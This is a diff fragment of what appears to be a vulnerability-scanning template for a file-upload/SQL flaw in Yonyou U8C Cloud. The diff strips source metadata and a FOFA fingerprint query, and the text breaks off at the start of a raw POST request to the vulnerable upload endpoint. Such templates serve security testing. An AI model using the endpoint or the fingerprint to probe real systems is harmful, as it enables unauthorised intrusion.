@@ -3,12 +3,8 @@ info:
   name: 用友-U8C-Cloud-upload-sql漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zttgst4eahmrhreg'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zttgst4eahmrhreg
-    fofa: app="用友-NC-Cloud"或header="nccloud"
 http:
 - raw:
   - 'POST /u8cloud/api/hr/attachment/upload?mssql_error HTTP/1.1
